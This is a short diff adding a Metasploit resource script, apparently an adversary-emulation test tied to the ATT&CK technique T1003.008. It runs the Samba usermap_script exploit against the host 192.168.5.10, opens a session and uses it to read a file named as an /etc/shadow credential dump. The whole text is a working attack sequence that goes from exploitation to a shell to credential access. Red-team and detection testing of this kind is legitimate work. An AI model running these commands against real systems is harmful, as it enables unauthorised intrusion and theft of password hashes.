@@ -1,0 +1,5 @@
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.5.10
+set LPORT 4646
+exploit -z
+sessions -c 'cat /tmp/T1003.008shadow.txt' -i 1
